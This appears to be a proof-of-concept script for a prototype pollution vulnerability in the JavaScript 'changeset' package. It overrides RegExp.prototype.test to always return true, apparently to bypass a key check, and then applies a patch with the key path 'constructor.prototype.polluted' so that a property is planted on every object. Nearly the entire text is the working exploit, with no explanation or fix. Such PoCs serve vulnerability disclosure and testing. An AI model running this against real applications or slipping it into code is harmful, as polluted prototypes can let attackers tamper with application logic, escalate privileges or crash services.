RegExp.prototype.test = () => true;
console.log({}.polluted);
const changeset = require('changeset');
const patch = [{
        type: 'put',
        key: [
            'constructor',
            'prototype',
            'polluted'
        ],
        value: 'yes'
    }];
changeset.apply(patch, {}, true);
console.log({}.polluted);